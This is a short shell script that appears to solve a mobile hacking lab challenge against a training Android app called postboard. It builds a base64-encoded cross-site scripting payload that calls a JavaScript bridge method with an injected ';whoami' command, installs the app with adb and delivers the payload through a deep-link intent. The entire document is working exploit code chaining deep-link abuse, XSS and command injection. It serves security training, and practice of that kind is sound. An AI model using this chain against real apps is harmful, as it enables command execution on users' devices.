PAYLOAD="$(base64 <<< '<img src=error onerror=WebAppInterface.postCowsayMessage(";whoami")>')"

adb install com.mobilehackinglab.postboard.apk
adb shell "am start -n com.mobilehackinglab.postboard/.MainActivity -a android.intent.action.VIEW -d postboard://postmessage/${PAYLOAD}"
adb shell 'am start -n com.mobilehackinglab.postboard/.MainActivity'

